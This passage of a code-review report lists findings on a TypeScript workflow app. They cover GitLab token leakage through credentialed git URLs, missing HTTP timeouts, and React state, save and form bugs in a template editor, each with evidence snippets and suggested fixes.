  - DATA-03: `lib/git/local.ts:52-60`, `lib/git/local.ts:71`, `lib/git/local.ts:149`, `lib/git/local.ts:157-159`, `lib/integrations/gitlab/git-host.ts:188-203`
  - ENG-25: `lib/engine/merge-arena.ts:92-96`, `lib/engine/merge-arena.ts:256-262`, `lib/engine/merge-arena.ts:291-295`
- **Suggested fix (combined):** Stop building `https://oauth2:<TOKEN>@…` URLs. Clone and push with the plain URL and supply credentials out of band (`GIT_CONFIG_*` env with `http.extraHeader`, or a `GIT_ASKPASS` helper) in both `lib/git/local.ts` and `lib/engine/merge-arena.ts`. Add one shared redaction pass (`//[^@/]+@` → `//***@`, plus known secret values) on `message`/`stderr`/`cmd` in the git wrapper and in merge-arena `errorText` before anything is thrown, emitted or persisted. Existing workspaces need their `remote.origin.url` rewritten.
- **Effort:** M (sources: DATA-03 M, ENG-25 M)

Original findings, verbatim:

#### DATA-03 (Area 4 — DB, git, integrations): GitLab token embedded in git URLs leaks into error messages, the event log and on-disk `.git/config`

- **Severity:** High
- **Category:** Correctness
- **Location:** `lib/git/local.ts:52-60`, `lib/git/local.ts:71`, `lib/git/local.ts:149`, `lib/git/local.ts:157-159`, `lib/integrations/gitlab/git-host.ts:188-203`
- **Problem:** `authedCloneUrl` returns `https://oauth2:<TOKEN>@host/...`, which is then passed as a git argv element.
  - Node's `execFile` error `message` is `Command failed: git -C … push https://oauth2:TOKEN@… branch:branch`. `pushBranch` interpolates the first 300 chars of that message into the thrown Error, which the engine emits to `events` and the UI.
  - `ensureClone` runs `git clone <authed url>`, which persists the token as `remote.origin.url` in `workspaces/<flowId>/.git/config` in plaintext. Clone errors propagate the full command line raw.
- **Evidence:**
  ```ts
  await this.git([...base, "push", this.authedUrl(repoUrl), `${branch}:${branch}`], opts);
  ...
  `could not push branch ${branch} — check VPN/network access ... (${String(lastErr?.message ?? lastErr).slice(0, 300)})`
  ```
- **Suggested fix:** Pass credentials out-of-band. Either use `git -c http.extraHeader="Authorization: Bearer <token>"` (or `PRIVATE-TOKEN`) through `GIT_CONFIG_*` env vars, or use a `GIT_ASKPASS` helper. Clone with the plain URL. Add a `redactSecrets()` pass in the shared git wrapper that rewrites `//[^@/]+@` → `//***@` on `message`, `stderr` and `cmd` before rethrowing.
- **Effort:** M

#### ENG-25 (Area 2 — Engine core & shared lib): Merge arena persists the token-bearing clone URL on disk and stores git stderr unredacted

- **Severity:** Medium
- **Category:** Correctness
- **Location:** `lib/engine/merge-arena.ts:92-96`, `lib/engine/merge-arena.ts:256-262`, `lib/engine/merge-arena.ts:291-295`
- **Problem:** `git clone <authedCloneUrl>` writes the credentialed URL into `workspaces/<id>-arena/.git/config` as `origin`. That much is certain, because git stores the remote as given. In addition, `errorText(e)` copies git stderr/stdout verbatim into `step_merges.error` and into events shown in the UI. Whether git echoes the credentialed URL in fetch and push errors depends on the git version, so that part needs verification. Nothing passes these strings through `redactSecrets` or a token mask.
- **Evidence:**
  ```ts
  const authed = (() => {
    try { return gitHostRegistry.forRepo(repoUrl).authedCloneUrl(repoUrl); } catch { return repoUrl; }
  })();
  await this.git(["clone", "--no-checkout", authed, dir], { timeout: 300_000 });
  ```
- **Suggested fix:** Clone with the plain URL and supply credentials per command (`-c http.extraHeader=...`, or a credential helper/`GIT_ASKPASS`). Mask anything URL-with-userinfo-shaped in `errorText` before persisting.
- **Effort:** M

### CR-024 [High] Single-GitLab-instance fallback claims every repo host and sends the GitLab token to foreign hosts

- **Status at `abaa007`:** **Open**, fix in [Task 59](review-tasks/59-security-credential-hygiene.md)
- **Current location:** lib/integrations/gitlab/client.ts:209-221 (instanceForRepo single-instance fallback); lib/integrations/gitlab/git-host.ts:175-182 (ownsRepo), 188-203 (authedCloneUrl)
- **Re-verification note:** With one GitLab instance registered, `instanceForRepo` still returns it for any host, so `ownsRepo` claims e.g. github.com URLs and `authedCloneUrl` embeds the GitLab PAT into a foreign-host URL. Drop the fallback (or limit it to `host === null` SSH-style URLs), and require a host match in `ownsRepo` and `authedCloneUrl`.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-04
- **Related:** CR-002 (APP-02); CR-219 (DATA-39)
- **Location:** `lib/integrations/gitlab/client.ts:209-220`, `lib/integrations/gitlab/git-host.ts:175-182`, `lib/integrations/gitlab/git-host.ts:188-203`
- **Problem:** `instanceForRepo` returns the only registered instance for any host. As a result, `ownsRepo()` returns true for e.g. `https://github.com/org/repo`, so `gitHostRegistry.forRepo` routes it to GitLab. `authedCloneUrl` then embeds the GitLab PAT into a URL pointing at the foreign host, and `LocalGit.pushBranch` and `ensureClone` send it there. It also masks the "no git host configured" error the registry is designed to raise.
- **Evidence:**
  ```ts
  if (match) return match;
  if (instances.length === 1) return instances[0];
  throw new Error(`No GitLab instance configured for host "${h ?? repoUrl}"...`);
  ```
- **Suggested fix:** Remove the single-instance fallback, or limit it to `h === null` (SSH-style URLs; see DATA-39 (CR-219)). Require a host match in `ownsRepo` and in `authedCloneUrl`. Return the plain URL when the host does not match.
- **Effort:** S

### CR-025 [High] No timeouts on any GitLab/Jira HTTP call — pollers and settings requests can hang indefinitely

- **Status at `abaa007`:** **Fixed** ([Task 31](review-tasks/31-git-host-clients.md))
- **Current location:** lib/integrations/gitlab/client.ts (request wrapper); lib/integrations/jira/service.ts; lib/engine/tasks/providers/jira.ts
- **Re-verification note:** No GitLab or Jira `fetch` passes an `AbortSignal` (there are zero `signal:` / `AbortSignal` uses in `lib/integrations`), so an unreachable host stalls the poller tick and settings requests until the OS TCP timeout. Add `signal: AbortSignal.timeout(<module const>)` to each call and map `TimeoutError` to a typed error.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-05
- **Related:** CR-099 (DATA-07); CR-101 (DATA-10); CR-102 (DATA-11); CR-104 (DATA-13)
- **Location:** `lib/integrations/gitlab/client.ts:75-82`, `lib/integrations/gitlab/client.ts:139-145`, `lib/integrations/gitlab/client.ts:311-322`, `lib/integrations/jira/service.ts:76-93`
- **Problem:** Every `fetch` lacks an `AbortSignal`. A blackholed self-hosted GitLab (VPN down) stalls the pipeline/comment pollers and webhook-driven flows until the OS TCP timeout, which can be minutes. Concurrent ticks then pile up. The git layer explicitly bounds every command ("never hangs the engine"), but HTTP does not.
- **Evidence:**
  ```ts
  const res = await fetch(`${this.baseUrl}${path}`, {
    ...init,
    headers: { ...this.headers(), ...(init?.headers || {}) },
  });
  ```
- **Suggested fix:** Add `signal: AbortSignal.timeout(GITLAB_TIMEOUT_MS)` (module constant, e.g. 15s) in `GitLabClient.api`, `getJobTrace`, both `testInstance` methods, and in the Jira provider. Map the `TimeoutError` to a typed error (see DATA-07 (CR-099)).
- **Effort:** S

### CR-026 [High] Event stream replays the cached batch and refetches from cursor "" on remount, so events are duplicated or out of order

- **Status at `abaa007`:** **Fixed** ([Task 30](review-tasks/30-events-feed.md) — merged feed in query cache via `flowEventsQueryOptions`, tail load, `mergeFlowEvents`)

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-01
- **Related:** CR-108 (APP-19, DATA-17)
- **Location:** `components/flows/cockpit/hooks/use-flow-events.ts:20-43`, `components/chat/ChatFeed.tsx:77-85`
- **Problem:** The buffer (`useState`) and the cursor (`useRef("")`) are per-mount, but the batch lives in the TanStack cache under `queryKeys.flows.events(flowId)`, which survives unmount for the default 5-minute gcTime. Leaving the cockpit and returning to the same flow behaves like this:
  1. `useQuery` returns the last cached batch immediately, and the effect appends those *newest* events into an empty buffer.
  2. The mount refetch runs with `cursor.current === ""`, so it re-downloads history from the start (oldest 200) and appends it after them.

  The feed ends up out of order. Run sections group wrongly, because `eventGrouper` assumes chronological input. For flows with ≤200 events, every event in the last batch appears twice, which gives duplicate React keys (`e${ev.id}`) in `ChatFeed`. In dev StrictMode the mount effect runs twice with the same cached `batch.data`, so it duplicates again. The cursor is also mutated inside `queryFn`, so it advances even when the result is later discarded.
- **Evidence:**
  ```ts
  const [buffer, setBuffer] = useState<FeedEvent[]>([]);
  const cursor = useRef("");
  ...queryFn: async () => { ... if (fresh.length) cursor.current = fresh[fresh.length - 1].id; return fresh; }
  useEffect(() => {
    if (batch.data?.length) setBuffer((prev) => [...prev, ...batch.data].slice(-EVENTS_BUFFER_MAX));
  }, [batch.data]);
  ```
- **Suggested fix:** Keep the accumulated buffer and cursor in the query cache instead of per-mount state. Two options:
  - Make the `queryFn` read the previous data via `queryClient.getQueryData(key)`, fetch `after=<last id>`, and return the merged, capped array (de-duplicated by `id`).
  - Alternatively, call `queryClient.removeQueries({ queryKey: events(flowId) })` on unmount and de-duplicate by `id` on append.

  Either way, drop the side-effecting ref and the `useEffect` append.
- **Effort:** M

### CR-027 [High] Cockpit `action()` swallows HTTP errors, gives no feedback, and has no pending/double-submit guard

- **Status at `abaa007`:** **Fixed** ([Task 15](review-tasks/15-frontend-mutation-conventions.md))
- **Current location:** components/flows/cockpit/FlowCockpit.tsx:65-72; components/flows/mutations/useFlowMutation.ts:13-24; callers: components/flows/panels/PanelShell.tsx:69,80, AgentView.tsx:57,62,139, DecisionView.tsx:61,66, BuildView.tsx:69-70, FanoutStepList.tsx:143,149,157, ReviewView.tsx:101,105,167, ResolveView.tsx:38,64, PipelineView.tsx:37,64, ScriptView.tsx:41, HttpView.tsx:38, StartView.tsx:47
- **Re-verification note:** Fixed part: `action()` now goes through `postJson`, which throws on `!res.ok`, so failures are no longer treated as success, and the plan panel uses a `useMutation` wrapper (`useFlowMutation`). Remaining: cockpit panels still call the raw callback with no `useMutation`, no pending/disabled state and no visible error, and most callers don't await or catch, so a 400 becomes an unhandled rejection with no feedback. Route every panel through `useFlowMutation`, expose `isPending`/`error` from it, render an alert with retry in `PanelShell`, and disable action buttons while pending.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-02
- **Related:** CR-030 (TPL-02); CR-038 (UI-04); CR-126 (FLOWUI-11); CR-129 (FLOWUI-14)
- **Location:** `components/flows/cockpit/FlowCockpit.tsx:94-105`. Every panel button uses it: `components/flows/panels/PanelShell.tsx:69,80`, `components/flows/panels/AgentView.tsx:59,64,140-143`, `components/flows/panels/DecisionView.tsx:60,65`, `components/flows/panels/BuildView.tsx:63-64`, `components/flows/panels/FanoutStepList.tsx:143,149,157`, `components/flows/panels/ReviewView.tsx:101,105`, `components/flows/panels/StartView.tsx:47-50`, `components/flows/plan/hooks/use-plan-step-drafts.ts:21-24`, `components/flows/plan/PlanView.tsx:78-119,194-197`
- **Problem:**
  - **Errors are invisible.** `fetch` is called raw and `res.ok` is never checked. The action route returns 400 with `{ error }` for every engine exception (missing `nodeKey`/`stepId`, invalid state transitions), so failed Approve, Retry, Skip, Run and Save clicks do nothing visible.
  - **Edits are discarded on failure.** Callers that await it treat a failure as success: the AgentView Configure dialog closes, and the plan-step editor exits edit mode, dropping the user's edits.
  - **Unhandled rejections.** Network errors reject, but most callers don't `await` or `catch`.
  - **Double submits.** There's no pending state, so buttons stay enabled and double clicks submit twice. For example, `set_plan_step` toggles twice and the change reverts, and `approve_build` fires twice.
  - **Convention.** Mutations aren't going through TanStack Query, against AGENTS.md §2.1.
- **Evidence:**
  ```ts
  const action = useCallback(async (act: string, body?: Record<string, unknown>) => {
    await fetch(`/api/flows/${flowId}/action`, { method: "POST", ... });
    await queryClient.invalidateQueries({ queryKey: queryKeys.flows.detail(flowId) });
  }, [flowId, queryClient]);
  ```
- **Suggested fix:**
  1. Move the call into a `useFlowAction(flowId)` hook built on `useMutation` with `postJson`, which throws on `!res.ok`, and invalidate in `onSettled`.
  2. Expose `isPending` and `error`. Render the error as an alert with retry in the cockpit or `PanelShell`, and disable action buttons while pending.
  3. Let callers `mutateAsync` and only close dialogs or exit edit mode on success.
- **Effort:** M

### CR-028 [High] NodePanel isn't keyed by node, so panel-local state leaks between nodes (including a wrong `choose_node` payload)

- **Status at `abaa007`:** **Fixed** (Task 35)
- **Current location:** components/flows/panels/NodePanel.tsx:53-60 (Panel / PanelShell rendered without key); components/flows/cockpit/FlowCockpit.tsx:111; leaking state: components/flows/panels/DecisionView.tsx:30-31,66, AgentView.tsx:29-30, ArtifactViews.tsx:31,111
- **Re-verification note:** The panel is still rendered as `<Panel />` with no `key`, so switching between two nodes served by the same component keeps the previous node's `useState`. For example, DecisionView posts node A's selection as `choose_node` for node B. Render `<Panel key={node.node_key} />` (and key the fallback `PanelShell`), or key `<NodePanel>` in the cockpit.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 5 — Flow runtime UI
- **Source:** FLOWUI-03
- **Location:** `components/flows/panels/NodePanel.tsx:16-18`. State that leaks: `components/flows/panels/DecisionView.tsx:29-30,65`, `components/flows/panels/AgentView.tsx:31-32`, `components/flows/panels/ArtifactViews.tsx:32,73`, `components/flows/plan/PlanView.tsx:46-50`, `components/flows/panels/StartView.tsx:32`
- **Problem:** When the user switches between two nodes served by the same panel component, React keeps the instance, so `useState` carries over. Examples:
  - two decision nodes, two agent nodes, two `build`/`step_build` panels, or two declarative kinds that all route through `DeclarativeView`.
  - DecisionView's `sel`/`rationale` from node A is posted as `choose_node { nodeKey: B, chosen: <A's labels> }`.
  - StartView keeps A's form values.
  - GenericArtifact/PlanView keep a selected version id that doesn't exist on B, so they silently fall back.
- **Evidence:**
  ```tsx
  const Panel = resolvePanel(node);
  if (Panel) {
    return <Panel flow={flow} node={node} action={action} ... />;
  }
  ```
- **Suggested fix:** Render `<Panel key={node.node_key} … />` (and the fallback `PanelShell`) so each node gets a fresh instance (§2.6 key reset).
- **Effort:** S

### CR-029 [High] Edits made while a save is in flight (and pending debounced prompt writes) are silently discarded

- **Status:** Fixed (Task 37)
- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
- **Current location:** components/builder/hooks/use-editor-save.ts:46-115; components/template-editor/PromptTab.tsx:41-45; components/template-editor/hooks/use-debounced-callback.ts:17-47
- **Re-verification note:** `runSave` still snapshots `machine.draft`, awaits validate, PATCH and refetch, then unconditionally `setDirty(false)` and `replaceDraft(…)`, discarding edits typed in the meantime. The debounced prompt write still captures a stale `node.config` and exposes no `flush()` (it flushes only on unmount). Flush pending debounced writes before snapshotting, compare a draft revision counter before `replaceDraft`/clearing dirty, and make debounced writers use a functional node patch.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-01
- **Related:** CR-030 (TPL-02)
- **Location:** `components/builder/hooks/use-editor-save.ts:46-115`, `components/template-editor/PromptTab.tsx:41-45`, `components/template-editor/hooks/use-debounced-callback.ts`
- **Problem:** `runSave` snapshots `machine.draft`, then awaits `/validate`, the PATCH and `detailQuery.refetch()`. Afterwards it unconditionally calls `machine.setDirty(false)` and `machine.replaceDraft(detailToDraft(refetched))`. Anything the user types during those three round-trips (the drawer stays open and editable) is overwritten by the server copy, and the dirty flag is cleared, so the leave-guard won't fire either. Prompt edits are written through a 500 ms debounce that captures `node.config` at call time. A Save click inside that window PATCHes without the tail, and the tail later lands on the replaced draft, or is dropped if the drawer unmounts. The debounced write also clobbers other config edits made in the same 500 ms because it spreads the stale `node.config`.
- **Evidence:**
  ```ts
  if (res.status !== 400 && !r?.error) {
    machine.setNotice("Draft saved — new flows snapshot this version.");
    machine.setDirty(false);
    ...
    const refreshed = await detailQuery.refetch();
    if (refreshed.data) {
      machine.replaceDraft(detailToDraft(refreshed.data).draft);
      layout.resetPositions(positionsOf(refreshed.data));
  ```
- **Suggested fix:** Flush pending debounced writes before snapshotting (expose `flush()` from `useDebouncedCallback` through a registry or context). Record a draft revision counter at snapshot time. After the PATCH, only `replaceDraft` and clear dirty if the revision hasn't changed; otherwise keep the local draft dirty. Make debounced writers use a functional `patchNode(key, cur => …)`.
- **Effort:** M

### CR-030 [High] Save reports success for 5xx, 413 and other non-400 failures; network errors are unhandled

- **Status:** Fixed (Task 37)
- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
- **Current location:** components/builder/hooks/use-editor-save.ts:92-114
- **Re-verification note:** Success is still judged by `res.status !== 400 && !r?.error`, so 5xx or 413 responses with a non-JSON body show "Draft saved" and clear dirty. The block is still `try/finally` with no `catch`, so network or validate rejections are unhandled. Check `!res.ok`, add a `catch` that sets the error, ideally by moving the save into a TanStack `useMutation`.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-02
- **Related:** CR-027 (FLOWUI-02); CR-029 (TPL-01); CR-237 (TPL-22)
- **Location:** `components/builder/hooks/use-editor-save.ts:85-115`
- **Problem:** Success is judged by `res.status !== 400 && !r?.error`, where `r` comes from `res.json().catch(() => null)`. A 500 or 502 with an HTML or empty body yields `r === null`, which counts as success. The draft is marked clean and the "Draft saved" notice shows although nothing was persisted. The block is `try/finally` with no `catch`, so a rejected `fetch` (offline, dev-server restart) or a rejected `/validate` call becomes an unhandled promise rejection: `saving` resets, but no error notice appears.
- **Evidence:**
  ```ts
  const r = (await res.json().catch(() => null)) as { error?: string } | null;
  if (res.status !== 400 && !r?.error) {
    machine.setNotice("Draft saved — new flows snapshot this version.");
    machine.setDirty(false);
  ...
  } finally {   // no catch
  ```
- **Suggested fix:** Use `if (!res.ok) { setSaveError(r?.error ?? \`Save failed (${res.status})\`); return; }`. Add a `catch` that sets the error notice. Better still, move the save into a TanStack `useMutation` with explicit `onError` handling, which also gives an in-flight guard.
- **Effort:** S

### CR-031 [High] Editing HTTP "Headers" writes a string into a `Record<string,string>` field and breaks the node

- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
- **Current location:** components/template-editor/components/ConfigPlainField.tsx:55-69; lib/engine/nodes/kinds/http/http-node.ts:43 (headers declared `type: "text"`); lib/engine/nodes/declarative-schemas.ts:122 (`z.record(z.string(), z.string())`)
- **Re-verification note:** HTTP `headers` is still a `"text"` field rendered as a Textarea that writes `e.target.value` verbatim, so the first keystroke replaces the record with a string and the node config fails Zod. Add a `kv`/`json` field type (a JSON textarea with a local buffer that parses on blur and shows errors, or a key/value editor) and declare headers with it.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-03
- **Location:** `components/template-editor/components/ConfigPlainField.tsx:55-69` (contract inputs: `lib/engine/nodes/http/http-node.ts:45`, `lib/engine/nodes/declarative-schemas.ts:71`)
- **Problem:** The HTTP node declares `headers` as `type: "text"`, but its config schema is `z.record(z.string(), z.string())`. For `"text"` fields `ConfigPlainField` renders a Textarea and writes `e.target.value` verbatim. The field displays an object value as pretty-printed JSON, but the first keystroke replaces the headers object with that raw string. The node's config then fails zod parsing, and live validation and save reject the template.
- **Evidence:**
  ```tsx
  typeof effective === "string"
    ? effective
    : effective != null
      ? JSON.stringify(effective, null, 2)
  ...
  onChange={(e) => onChange(e.target.value || undefined)}
  ```
- **Suggested fix:** Give record- or object-valued fields a key/value editor, or a JSON textarea that parses on blur and keeps a local text buffer plus a parse-error message. Have the contract declare `type: "kv"` or `"json"` for headers instead of `"text"`.
- **Effort:** M

### CR-032 [High] Client lets authors build graphs that save rejects; live validation never catches them

- **Status at `abaa007`:** **Fixed** ([Task 23](review-tasks/23-graph-semantics-and-validation.md))
- **Current location:** components/builder/hooks/use-editor-actions.ts:173 (duplicateNode), 261 (addEdge dedupe), 336-355 (addCatalogNode: only Start is singleton); components/template-editor/draft.ts:51-60 (uniqueKey); components/template-editor/EdgeEditor.tsx:85-102; components/template-editor/components/BuilderFlow.tsx:167-175; components/template-editor/hooks/use-template-validation.ts:85-100; app/api/templates/[id]/validate/route.ts:62 (lintTemplate only); lib/engine/templates/template-store.ts:776-800 (validated)
- **Re-verification note:** Unchanged: `/validate` still runs only `lintTemplate`, while save's `TemplateStore.validated()` also enforces built-in keys, the key regex, edge dedupe and trigger normalization, so the client can build graphs (`plan_copy`, `plan_2`, digit-leading keys, EdgeEditor self or duplicate edges, stale decision labels) that pass live validation and then fail on save. Extract the structural rules into a shared pure validator run by both `/validate` and save, and tighten the client actions (no Duplicate for built-ins, built-ins as singletons, filtered EdgeEditor targets).

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-04
- **Location:** `components/builder/hooks/use-editor-actions.ts:173-206` (duplicateNode), `components/builder/hooks/use-editor-actions.ts:290-355` (addInstance/addCatalogNode), `components/builder/hooks/use-editor-actions.ts:258-275` (addEdge dedupe), `components/template-editor/draft.ts:51-60` (uniqueKey), `components/template-editor/EdgeEditor.tsx:85-102`, `components/template-editor/components/BuilderFlow.tsx:150-158` (onConnect), `components/template-editor/hooks/use-template-validation.ts:93-98`
- **Problem:** The server rejects all of the following, but only on save, as one opaque error string. The live `/validate` endpoint runs `lintTemplate` only and reports none of them:
  - (a) Duplicating a built-in instance produces `plan_copy`, and adding a second built-in from the palette produces `plan_2`, while the server requires built-in keys to equal `nt.key`. `addCatalogNode` only blocks a second `start`.
  - (b) `uniqueKey` slugs can start with a digit or `_`, which fails `^[a-z][a-z0-9_]*$`.
  - (c) EdgeEditor's From/To selects allow self-edges and duplicate edges. Changing the source of a decision edge keeps a label that isn't among the new source's choices.
  - (d) `addEdge`'s duplicate check `(!e.label || e.label === branchLabel)` doesn't match the server's dedupe tuple.
  - (e) The client validates against the raw `trigger.task_type`. The server normalizes a missing or unknown type to the first provider, so `{{task.*}}` refs pass live but fail on save.

  The user gets a clean "no problems" panel and then a failed save.
- **Evidence:**
  ```ts
  // use-editor-actions.ts:345-355: only Start is treated as a singleton
  if (
    catalogKey === "start" &&
    draft.nodes.some((n) => n.nodeTemplateId === START_NODE_TEMPLATE_ID)
  ) { setNotice("Only one Start node is allowed — ..."); return; }
  void addInstance({ nodeTemplateId, ...
  ```
- **Suggested fix:** Extract the structural rules from `TemplateStore.validated()` into a shared pure validator, and run it in both `/validate` and save so one ruleset exists. In the client:
  - Disable Duplicate for built-ins.
  - Treat every built-in catalog entry as a singleton.
  - Prefix digit-leading slugs.
  - Filter self/duplicate targets out of the EdgeEditor and `isValidConnection`.
  - Clear or revalidate the label when an edge's source changes.
- **Effort:** M

### CR-033 [High] Opening the Start "fields" or Output-schema tab dirties the draft and turns catalog defaults into instance overrides

- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
- **Current location:** components/template-editor/components/StartContractEditor.tsx:70-93; components/template-editor/hooks/use-output-schema-draft.ts:44-69 (eslint-disable at 68)
- **Re-verification note:** Both components still emit `onChange` from mount and change effects, so just opening the Start "fields" or Output-schema tab dirties the draft (including on read-only built-ins) and freezes the catalog default `output_schema` into instance config. Emit only from user input handlers, derive the displayed text from `config ?? default` during render, skip writes that deep-equal the effective value, and drop the ref and `eslint-disable` workaround.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-05
- **Related:** CR-141 (TPL-16); CR-163 (TPL-23, TOOL-10)
- **Location:** `components/template-editor/components/StartContractEditor.tsx:76-93`, `components/template-editor/hooks/use-output-schema-draft.ts:44-69`
- **Problem:** Both components call `onChange` from mount effects, deriving config from local text state. Just viewing the tab:
  - marks the template dirty, so the leave-confirm and Save-enabled state turn on with no user edit. This also happens on read-only built-ins.
  - for the output schema, writes the catalog's default `output_schema` into the instance config. After a save, that instance no longer follows catalog default updates.

  The effects also rely on refs and an `eslint-disable` (see TPL-23 (CR-163)) to avoid loops.
- **Evidence:**
  ```ts
  useEffect(() => {
    if (parsed.error) return;
    const { config, fields, waitFor, onChange } = current.current;
    const next = withContextFields(buildStartContract(parsed.inputs, fields), waitFor);
    onChange({ config: { ...config, contract: next } });
  }, [tsText, parsed]);
  ```
- **Suggested fix:** Only emit on user input (in the `onChange` handler of the textarea/select), never from an effect. Derive the displayed text from `config ?? default` during render, and keep local state only for the unparsed buffer. Skip emitting when the parsed value deep-equals the current effective value.
- **Effort:** M

### CR-034 [High] Path autocomplete hijacks Tab/Enter, auto-inserts the first variable, and traps keyboard focus

- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
- **Current location:** components/template-editor/condition-builder/PathAutocomplete.tsx:64-93 (highlight starts at 0, window capture keydown, Tab/Enter preventDefault); components/template-editor/condition-builder/PathField.tsx:45 (opens on focus); components/template-editor/condition-builder/ExpressionInput.tsx:98
- **Re-verification note:** The popover still opens on focus with an empty token, and a window capture-phase listener turns Tab or Enter into "pick the first option", so tabbing through a path field inserts a variable and traps focus (WCAG 2.1.2). Open only on typing or ArrowDown, start `highlight` at -1, never intercept Tab, and move the handler to the input's `onKeyDown`.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 6 — Template authoring
- **Source:** TPL-06
- **Location:** `components/template-editor/condition-builder/PathAutocomplete.tsx:64-93`, `components/template-editor/condition-builder/PathField.tsx:45-66`, `components/template-editor/condition-builder/ExpressionInput.tsx:98-121`
- **Problem:** The popover opens on focus with an empty token, and an empty token matches every option. `PathPopover` installs a window capture-phase `keydown` listener. On Tab or Enter it calls `preventDefault()` and picks the highlighted option, which defaults to the first one. Tabbing into a path or expression field and tabbing out therefore inserts the first variable and keeps focus in the field (a WCAG 2.1.2 keyboard trap). Enter in an empty field also inserts instead of submitting.
- **Evidence:**
  ```ts
  } else if (e.key === "Enter" || e.key === "Tab") {
    e.preventDefault();
    e.stopPropagation();
    onPick(shown[Math.min(highlight, count - 1)].path);
  ...
  window.addEventListener("keydown", onKey, true);
  ```
- **Suggested fix:** Open only after the user types, or on ArrowDown. Require an explicitly highlighted item (`highlight >= 0`, initially -1) before Enter picks, and never intercept Tab. Attach the handler to the input's `onKeyDown` rather than a window capture listener.
- **Effort:** S

### CR-035 [High] Repo form persists auto-detected policy as explicit per-repo overrides

- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
- **Current location:** components/settings/repos/ReposSection.tsx:29-37, components/settings/repos/hooks/use-repo-form.ts:48-56, components/settings/repos/hooks/use-detected-policy.ts:19-29
- **Re-verification note:** The effect still copies `/api/repos/detect` output into empty `install_command`/`sync_paths` whenever the editor is open, so saving an edit pins detected values as per-repo overrides and a cleared field gets refilled. Show detected values as placeholder/help text read during render, send only user-typed fields, disable the detect query when `local_path` is empty, and drop the effect + `applyDetected`.

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-01
- **Location:** `components/settings/repos/ReposSection.tsx:31-37`, `components/settings/repos/hooks/use-repo-form.ts:49-56`, `components/settings/repos/hooks/use-detected-policy.ts:19-29`
- **Problem:** Whenever the editor is open, an effect copies `/api/repos/detect` output into every empty `install_command` / `sync_paths` field. The detect route always returns the default `sync_paths` globs, even with no local path. As a result:
  - Opening **Edit** on a repo that relies on auto-detection and saving any change (for example a rename) writes the detected command and globs to the DB as overrides. After that, changes to the lockfile or to the engine's defaults no longer apply.
  - New repos always get `sync_paths` pinned.
  - If the user clears a prefilled field, the next `detected` identity change (window-focus refetch, or a local-path edit) fills it in again, so "use auto-detection" can't be expressed.

  This contradicts the form's own copy: "fields you fill win over it".
- **Evidence:**
  ```tsx
  useEffect(() => {
    if (editorOpen) applyDetected(detected);
  }, [detected, editorOpen, applyDetected]);
  // use-repo-form.ts
  install_command: prev.install_command || d.install_command || "",
  sync_paths: prev.sync_paths || d.sync_paths,
  ```
- **Suggested fix:** Stop writing detected values into form state. Show them as `placeholder` / "Auto-detected: …" help text (read during render from `detected`), and only send fields the user actually typed. If prefill is still wanted, track a per-field `touched` / `fromDetection` flag and strip detection-sourced values from the save payload. Disable the detect query when `local_path` is empty. This also removes the effect (§2.6).
- **Effort:** M

### CR-036 [High] Settings fetchers swallow every error, so error states can't render and the UI shows false empty states

- **Status at `abaa007`:** **Fixed** ([Task 14](review-tasks/14-frontend-throwing-fetchers.md))

- **Severity:** High
- **Category:** Correctness
- **Area:** Area 7a — Settings, tasks, shared UI, constants, types
- **Source:** UI-02
- **Related:** CR-038 (UI-04); CR-052 (APP-17); CR-135 (TPL-10); CR-143 (TPL-18); CR-150 (UI-08)
- **Location:** `components/settings/queries.ts:10-31`, `components/settings/context.tsx:68-70`, `app/(workspace)/settings/page.tsx:76-84` (consumer), `components/settings/integrations/HarnessTab.tsx:35,59-65`, `components/settings/repos/ReposSection.tsx:78-79`
- **Problem:** `fetchJson` returns a fallback (`null`, `{}`) on any HTTP or network error, so `useQuery` never enters `isError`. The consequences:
  - When `/api/repos` fails, the Repositories page shows "No repos registered yet". Users may re-register repos that already exist.
  - When `/api/settings` fails, the Harness tab shows "No harness connected" with a Connect CTA, and General shows "Settings are unavailable" with **no retry action**. §2.8 requires a message plus a retry.
  - The helper also shadows the throwing `fetchJson` in `hooks/fetch-json.ts`: same name, opposite semantics.
- **Evidence:**
  ```ts
  export async function fetchJson<T>(url: string, fallback: T): Promise<T> {
    try {
      const res = await fetch(url);
      if (!res.ok) return fallback;
      return (await res.json()) as T;
    } catch { return fallback; }
  }
  ```
- **Suggested fix:**
  1. Use the throwing `fetchJson` from `@/hooks/fetch-json` for the three settings queries.
  2. Expose `isError` and `refetch` per query from `SettingsProvider`.
  3. Render an error alert with a Retry button in each sub-route (and in HarnessTab) before the empty state.
  4. Keep the resilient variant only for `useDetectedPolicy`, renamed (for example `fetchJsonOr`).
- **Effort:** M

### CR-037 [High] Tasks feed ignores query errors, so a failed provider fetch renders as "No tasks match the current filters"

- **Status at `abaa007`:** **Open**, fix in [Task 43](review-tasks/43-tasks-feature.md)
- **Current location:** components/tasks/hooks/use-live-tasks.ts:35-39,52-69, components/tasks/TasksView.tsx:53,111,137-148
